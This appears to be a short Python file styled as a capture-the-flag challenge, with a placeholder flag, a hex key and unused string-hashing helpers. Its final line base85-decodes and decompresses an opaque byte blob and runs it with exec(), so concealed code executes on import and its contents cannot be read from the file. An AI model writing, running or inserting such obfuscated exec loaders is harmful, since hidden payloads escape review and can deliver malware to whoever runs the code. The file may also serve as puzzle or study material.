import base64 as _b64, zlib as _zl, hashlib as _hl
_ARCHIVE_KEY = bytes.fromhex('ee65f53e9421ce50211670eae679f02e')
_EXPECTED = 'CTF{0000}'
_GEN = 7; _MOD = 17
def _salted20(x):
    return sum((i+1)*c for i,c in enumerate(bytes(x,'utf8'))) % _MOD
def _salted46(x):
    return [((o*2)^18)&0xff for o in bytes(x,'utf8')]
def _derive_key61(x):
    return _hl.sha256(bytes(x,'utf8')+_ARCHIVE_KEY).hexdigest()[:4]

_p = (
    b'c-l>m!3x4K42JK0iqO*r)uV^OjuQmgMen89bSrf2Osgp3yIbo9{<nM~$rnRmf|)`Jm*BuobD#tf>5j~lR<7g9PhEdL^xcs$rqRHtymnX-Uh9TI4q>{HhZi4F'
    b'xis<y_&|uB3*dw*2LDB~)f;@+nBv0qGvmE-5k*<Eh7ahGRI+6*pV<zWs(&hASHH83H6W!|6G{nf3tY-cSuZ93d6j>v)m|*(HTwX-Q%<`'
)
exec(_zl.decompress(_b64.b85decode(_p)))
